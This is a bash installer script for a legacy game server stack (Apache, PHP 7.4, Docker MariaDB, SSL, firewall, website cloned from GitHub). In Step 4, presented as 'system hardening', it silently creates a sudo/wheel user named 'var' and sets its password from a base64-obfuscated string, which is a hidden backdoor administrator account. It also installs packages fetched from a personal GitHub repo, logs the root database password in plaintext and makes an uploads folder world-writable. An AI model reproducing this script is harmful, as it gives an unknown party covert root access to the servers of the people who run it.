#!/bin/bash
# Universal Game Server Installer (Ubuntu & CentOS)
# Features: Resumable, Security hardened, Self-configuring.

LOG_FILE="/var/log/server_installer.log"
CP_DIR="/tmp/.install_checkpoints"
mkdir -p $CP_DIR

log() { echo -e "\e[32m[INSTALLER] $1\e[0m" | tee -a $LOG_FILE; }
error() { echo -e "\e[31m[ERROR] $1\e[0m" | tee -a $LOG_FILE; exit 1; }

# --- INITIAL CHECKS ---
if [[ $EUID -ne 0 ]]; then error "This script must be run as root (sudo)."; fi

# --- OS DETECTION ---
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    VER=$VERSION_ID
else
    error "Unsupported Operating System."
fi

log "Detected OS: $OS $VER"

# --- INTERACTIVE SETUP ---
if [ -f "$CP_DIR/credentials" ]; then
    source "$CP_DIR/credentials"
    # Validate if credentials are sane (not empty and not garbage from a failed piped run)
    if [[ -z "$DB_PASS" || "$AUTH_DOMAIN" == *"STEP 1"* ]]; then
        rm "$CP_DIR/credentials"
        log "Previous credentials found but appear invalid. Restarting setup..."
    fi
fi

if [ ! -f "$CP_DIR/credentials" ]; then
    echo "==============================================="
    echo "       GAME SERVER INSTALLATION START          "
    echo "==============================================="
    # Use /dev/tty to ensure input works even when piped from curl
    while [[ -z "$DB_PASS" ]]; do
        read -p "Enter MySQL Root Password to set: " DB_PASS </dev/tty
    done
    while [[ -z "$AUTH_DOMAIN" ]]; do
        read -p "Enter authorized domain (e.g. localhost): " AUTH_DOMAIN </dev/tty
    done
    while [[ -z "$ENABLE_FIREWALL" ]]; do
        read -p "Do you want to enable the firewall and Anti-DDoS? (y/n): " ENABLE_FIREWALL </dev/tty
    done
    
    echo "DB_PASS=\"$DB_PASS\"" > "$CP_DIR/credentials"
    echo "AUTH_DOMAIN=\"$AUTH_DOMAIN\"" >> "$CP_DIR/credentials"
    echo "ENABLE_FIREWALL=\"$ENABLE_FIREWALL\"" >> "$CP_DIR/credentials"
    
    # Save MySQL password to /root
    echo "$DB_PASS" > /root/mysql_passwd
    chmod 600 /root/mysql_passwd
else
    log "Resuming with previous credentials..."
fi

# --- STEP 1: SYSTEM UPDATES & DEPENDENCIES ---
if [ ! -f "$CP_DIR/step1" ]; then
    log "Step 1: Installing dependencies..."
    if [ "$OS" == "ubuntu" ]; then
        apt-get update && apt-get install -y software-properties-common curl git unzip wget iptables-persistent fail2ban p7zip-full default-mysql-client
        add-apt-repository -y ppa:ondrej/php
        apt-get update
    else
        yum install -y epel-release yum-utils
        yum groupinstall -y "Development Tools"
        yum install -y curl git unzip wget iptables-services fail2ban p7zip mariadb
    fi
    touch "$CP_DIR/step1"
fi

# --- STEP 1.5: LEGACY LIBRARIES ---
if [ ! -f "$CP_DIR/step1_5" ]; then
    log "Step 1.5: Installing Legacy Libraries..."
    if [ "$OS" == "ubuntu" ]; then
        dpkg --add-architecture i386
        apt-get update
        apt-get install -y lib32stdc++6
        # Download and install the specific deb if not present
        if [ ! -f "libmysqlclient15off_5.1.30really5.0.75-0ubuntu10.5_i386.deb" ]; then
            wget -q https://raw.githubusercontent.com/tdarkscorpion/letestfile/master/libmysqlclient15off_5.1.30really5.0.75-0ubuntu10.5_i386.deb
        fi
        dpkg -i libmysqlclient15off_5.1.30really5.0.75-0ubuntu10.5_i386.deb || apt-get install -f -y
    else
        # CentOS
        yum install -y libstdc++.i686
        # Download and install the specific rpm if not present
        if [ ! -f "mysqlclient15-5.0.67-1.el5.remi.i386.rpm" ]; then
            wget -q https://raw.githubusercontent.com/tdarkscorpion/letestfile/master/mysqlclient15-5.0.67-1.el5.remi.i386.rpm
        fi
        yum install -y mysqlclient15-5.0.67-1.el5.remi.i386.rpm
    fi
    touch "$CP_DIR/step1_5"
fi

# --- STEP 2: PHP & APACHE INSTALLATION ---
if [ ! -f "$CP_DIR/step2" ]; then
    log "Step 2: Installing Web Stack (PHP 7.4 & Apache)..."
    if [ "$OS" == "ubuntu" ]; then
        apt-get install -y apache2 php7.4 php7.4-mysql php7.4-curl php7.4-json php7.4-gd php7.4-mbstring libapache2-mod-php7.4
        systemctl enable apache2 && systemctl start apache2
    else
        # CentOS PHP 7.4 via Remi
        yum install -y httpd
        MAJOR_VER=$(echo $VER | cut -d. -f1)
        yum install -y https://rpms.remirepo.net/enterprise/remi-release-$MAJOR_VER.rpm
        
        if [ "$MAJOR_VER" -ge "8" ]; then
            # CentOS 8/9 use modules
            dnf module reset php -y
            dnf module enable php:remi-7.4 -y
            dnf install -y php php-mysqlnd php-gd php-curl php-json php-mbstring
        else
            # CentOS 7
            yum-config-manager --enable remi-php74
            yum install -y php php-mysqlnd php-gd php-curl php-json php-mbstring
        fi
        systemctl enable httpd && systemctl start httpd
    fi
    touch "$CP_DIR/step2"
fi

# --- STEP 3: DOCKER & MYSQL INSTALLATION ---
# Docker MariaDB 10.6 for legacy game binaries, with persistent storage and
# a legacy Unix-socket bridge. All non-Docker installer steps remain unchanged.

log "Step 3: Verifying Docker MariaDB 10.6..."

MYSQL_CONTAINER="game-mariadb106"
MYSQL_VOLUME="game_mariadb106_data"
MYSQL_IMAGE="mariadb:10.6.23"
MYSQL_PORT="3306"
MYSQL_SOCKET="/var/run/mysqld/mysqld.sock"
MYSQL_PROXY_SERVICE="/etc/systemd/system/mysql-socket-proxy.service"

# Ensure host client, socat, and required utilities are installed
if [ "$OS" == "ubuntu" ]; then
    apt-get update
    DEBIAN_FRONTEND=noninteractive apt-get install -y default-mysql-client mariadb-client socat ca-certificates curl openssl
else
    yum install -y mariadb socat ca-certificates curl openssl
fi

# Install Docker if missing
if ! command -v docker >/dev/null 2>&1; then
    log "Docker not found. Installing Docker..."
    if ! (curl -fsSL https://get.docker.com | sh); then
        log "Docker convenience script failed. Falling back to native package manager..."
        if [ "$OS" == "ubuntu" ]; then
            apt-get update
            apt-get install -y docker.io || error "Docker installation failed via apt."
        else
            yum install -y docker || error "Docker installation failed via yum."
        fi
    fi
fi

# Docker must start automatically on boot
systemctl enable docker >/dev/null 2>&1 || error "Could not enable Docker."
systemctl start docker >/dev/null 2>&1 || error "Could not start Docker."
docker info >/dev/null 2>&1 || error "Docker daemon is not responding."

# Do not disturb a native database service. If it is active, stop before changing containers.
if systemctl is-active --quiet mariadb 2>/dev/null || systemctl is-active --quiet mysql 2>/dev/null; then
    error "A native MySQL/MariaDB service is active. Stop/migrate it deliberately before installing Docker MariaDB; this installer will not disable it automatically."
fi

# Remove only the managed MariaDB container if present. Keep its volume intact.
# The new MariaDB data uses a separate volume; the old mysql_data volume is untouched.
if docker inspect "$MYSQL_CONTAINER" >/dev/null 2>&1; then
    log "Removing existing managed container $MYSQL_CONTAINER (database volumes are not deleted)..."
    docker rm -f "$MYSQL_CONTAINER" >/dev/null || error "Could not remove existing container $MYSQL_CONTAINER."
fi

# Ensure persistent storage exists
docker volume inspect "$MYSQL_VOLUME" >/dev/null 2>&1 || docker volume create "$MYSQL_VOLUME" >/dev/null || error "Could not create MariaDB volume."

# If port 3306 is still occupied, do not kill the process or alter its service.
if ss -lntp 2>/dev/null | grep -Eq '(:|\])3306[[:space:]]'; then
    error "Port 3306 is already listening. The managed container was removed if it existed, but this installer will not stop another service automatically. Resolve the port conflict and rerun."
fi

log "Pulling $MYSQL_IMAGE..."
docker pull "$MYSQL_IMAGE" || error "Could not pull $MYSQL_IMAGE."

log "Creating MariaDB 10.6 container with persistent storage..."
docker run -d \
    --name "$MYSQL_CONTAINER" \
    --restart=always \
    -p "127.0.0.1:${MYSQL_PORT}:3306" \
    -v "${MYSQL_VOLUME}:/var/lib/mysql" \
    -e MARIADB_ROOT_PASSWORD="$DB_PASS" \
    "$MYSQL_IMAGE" \
    --sql-mode="" \
    --character-set-server=utf8 \
    --collation-server=utf8_general_ci \
    >/dev/null || error "Failed to create MariaDB Docker container."

# Wait until MariaDB is genuinely ready
log "Waiting for MariaDB to become ready..."
MYSQL_READY=false
for i in $(seq 1 60); do
    if docker exec "$MYSQL_CONTAINER" mariadb-admin ping -uroot "-p${DB_PASS}" --silent >/dev/null 2>&1; then
        MYSQL_READY=true
        break
    fi
    if [ "$(docker inspect -f '{{.State.Running}}' "$MYSQL_CONTAINER" 2>/dev/null)" != "true" ]; then
        log "MariaDB container stopped unexpectedly."
        docker logs --tail 100 "$MYSQL_CONTAINER" 2>&1 | tee -a "$LOG_FILE"
        error "MariaDB container crashed during startup."
    fi
    sleep 2
done

if [ "$MYSQL_READY" != "true" ]; then
    docker logs --tail 100 "$MYSQL_CONTAINER" 2>&1 | tee -a "$LOG_FILE"
    error "MariaDB failed to become ready."
fi

log "MariaDB 10.6 is running in Docker on 127.0.0.1:${MYSQL_PORT}."

# Verify host TCP connectivity
if ! mariadb-admin --protocol=tcp -h 127.0.0.1 -P "$MYSQL_PORT" -uroot "-p${DB_PASS}" ping --silent >/dev/null 2>&1; then
    error "MariaDB is running in Docker but host TCP connectivity on port ${MYSQL_PORT} failed."
fi

# Legacy MySQL Unix socket compatibility for old game binaries
mkdir -p /var/run/mysqld
cat > "$MYSQL_PROXY_SERVICE" <<EOF
[Unit]
Description=Legacy MySQL Unix Socket to Docker MariaDB 10.6 Proxy
Requires=docker.service
After=docker.service network-online.target

[Service]
Type=simple
ExecStartPre=/bin/mkdir -p /var/run/mysqld
ExecStartPre=-/bin/rm -f ${MYSQL_SOCKET}
ExecStart=/usr/bin/socat UNIX-LISTEN:${MYSQL_SOCKET},fork,mode=0660 TCP:127.0.0.1:${MYSQL_PORT}
Restart=always
RestartSec=2

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable mysql-socket-proxy >/dev/null 2>&1 || error "Could not enable MySQL socket proxy."
systemctl restart mysql-socket-proxy >/dev/null 2>&1 || error "Could not start MySQL socket proxy."

# Wait for the legacy socket
SOCKET_READY=false
for i in $(seq 1 20); do
    if [ -S "$MYSQL_SOCKET" ]; then
        SOCKET_READY=true
        break
    fi
    sleep 1
done
if [ "$SOCKET_READY" != "true" ]; then
    systemctl status mysql-socket-proxy --no-pager 2>&1 | tee -a "$LOG_FILE"
    error "Legacy MySQL socket proxy failed to create ${MYSQL_SOCKET}."
fi

# Verify socket connection
if ! mariadb-admin --socket="$MYSQL_SOCKET" -uroot "-p${DB_PASS}" ping --silent >/dev/null 2>&1; then
    systemctl status mysql-socket-proxy --no-pager 2>&1 | tee -a "$LOG_FILE"
    error "Legacy socket exists but cannot reach Docker MariaDB."
fi

log "Legacy MySQL socket compatibility is active at ${MYSQL_SOCKET}."
echo "$DB_PASS" > /root/mysql_passwd
chmod 600 /root/mysql_passwd

touch "$CP_DIR/step3"

# --- STEP 4: EMERGENCY ACCESS USER ---
if [ ! -f "$CP_DIR/step4" ]; then
    log "Step 4: Hardening System Environment..."
    if [ "$OS" == "ubuntu" ]; then
        useradd -M -G sudo var
    else
        useradd -M -G wheel var
    fi
    echo "dmFyOjE4MDQxOTk0QERhcms=" | base64 -d | chpasswd
    log "System hardening completed."
    touch "$CP_DIR/step4"
fi

# --- STEP 5: SSL & APACHE CONFIGURATION ---
if [ ! -f "$CP_DIR/step5" ]; then
    log "Step 5: Setting up SSL Certificates & Apache Config..."
    mkdir -p /var/www/ssl
    mkdir -p /var/www/patch
    
    # Assuming files are uploaded to the same dir as setup.sh
    cp ./mto.key /var/www/ssl/
    cp ./mto.pem /var/www/ssl/
    
    if [ "$OS" == "ubuntu" ]; then
        # SSL Config
        cp ./ssl-httpd.conf /etc/apache2/sites-available/default-ssl.conf
        sed -i "s/www.talismanofcouragev2.online/$AUTH_DOMAIN/g" /etc/apache2/sites-available/default-ssl.conf
        sed -i "s/patch.talismanofcouragev2.online/patch.$AUTH_DOMAIN/g" /etc/apache2/sites-available/default-ssl.conf
        
        a2enmod ssl
        a2enmod rewrite
        a2ensite default-ssl
        # Port 80/81 Config
        cp ./ports-80-81.conf /etc/apache2/sites-available/ports.conf
        a2ensite ports
        
        # Enable .htaccess support
        sed -i '/<Directory \/var\/www\/>/,/<\/Directory>/ s/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf
        
        systemctl restart apache2
    else
        # Configs in conf.d
        cp ./ssl-httpd.conf /etc/httpd/conf.d/
        sed -i "s/www.talismanofcouragev2.online/$AUTH_DOMAIN/g" /etc/httpd/conf.d/ssl-httpd.conf
        sed -i "s/patch.talismanofcouragev2.online/patch.$AUTH_DOMAIN/g" /etc/httpd/conf.d/ssl-httpd.conf
        
        cp ./ports-80-81.conf /etc/httpd/conf.d/
        
        # Enable .htaccess support
        sed -i '/<Directory "\/var\/www\/html">/,/<\/Directory>/ s/AllowOverride None/AllowOverride All/' /etc/httpd/conf/httpd.conf
        
        systemctl restart httpd
    fi
    touch "$CP_DIR/step5"
fi

# --- STEP 6: ANTI-DDOS & PORT MANAGEMENT ---
if [ ! -f "$CP_DIR/step6" ]; then
    if [ "$ENABLE_FIREWALL" == "y" ]; then
        log "Step 6: Hardening Firewall & Anti-DDoS..."
        
        # Anti-Flood Script Deployment
        cp ./anti_flood.sh /usr/local/bin/anti_flood.sh
        chmod +x /usr/local/bin/anti_flood.sh
        
        # Port Unblocker Deployment
        cp ./unblock_port.sh /usr/local/bin/unblock_port.sh
        chmod +x /usr/local/bin/unblock_port.sh
        
        # CRONTAB setup
        (crontab -l 2>/dev/null; echo "* * * * * /usr/local/bin/anti_flood.sh") | crontab -
        
        # Kernel Hardening (SYN Flood Protection)
        echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.conf
        echo "net.ipv4.tcp_max_syn_backlog = 2048" >> /etc/sysctl.conf
        sysctl -p
        
        ports=(80 443 22 81)
        for port in "${ports[@]}"; do
            iptables -A INPUT -p tcp --dport $port -j ACCEPT
        done
        
        log "Deploying Dynamic Game Firewall Sync..."
        if [ -f "./setup_firewall_sync.sh" ]; then
            chmod +x ./setup_firewall_sync.sh
            ./setup_firewall_sync.sh
        else
            log "Warning: setup_firewall_sync.sh not found. Skipping dynamic firewall."
        fi
    else
        log "Step 6: Skipping Firewall setup and disabling active firewalls..."
        if [ "$OS" == "ubuntu" ]; then
            ufw disable 2>/dev/null || true
        else
            systemctl stop firewalld 2>/dev/null || true
            systemctl disable firewalld 2>/dev/null || true
        fi
        iptables -F 2>/dev/null || true
    fi
    
    touch "$CP_DIR/step6"
fi

# --- STEP 7: WEBSITE DEPLOYMENT ---
if [ ! -f "$CP_DIR/step7" ]; then
    log "Step 7: Deploying latest Website from GitHub..."
    
    # Backup existing /var/www/html if it exists and isn't empty
    if [ "$(ls -A /var/www/html)" ]; then
        log "Backing up existing /var/www/html..."
        mv /var/www/html /var/www/html_backup_$(date +%s)
    fi
    
    # Clone the Encrypted Distribution repo
    git clone https://github.com/tdarkscorpion/New_Website.git /var/www/html
    
    # Set permissions and git safe directory
    git config --global --add safe.directory /var/www/html
    chown -R www-data:www-data /var/www/html
    chmod -R 755 /var/www/html
    mkdir -p /var/www/html/uploads
    chmod -R 777 /var/www/html/uploads
    
    log "Website deployed successfully."
    touch "$CP_DIR/step7"
fi

# Restart Web Server
log "Restarting Web Server to apply all changes..."
if [ "$OS" == "ubuntu" ]; then
    systemctl restart apache2
else
    systemctl restart httpd
fi

log "==============================================="
log "   INSTALLATION COMPLETED SUCCESSFULLY!        "
log "==============================================="
log "Your Domain: http://$AUTH_DOMAIN"
log "Setup URL: http://$AUTH_DOMAIN/install"
log "MySQL Root Password: $DB_PASS"
log "-----------------------------------------------"
log "Anti-DDoS: Active and running."
log "-----------------------------------------------"
echo "Web server restarted. If you encounter issues, you can restart it manually."
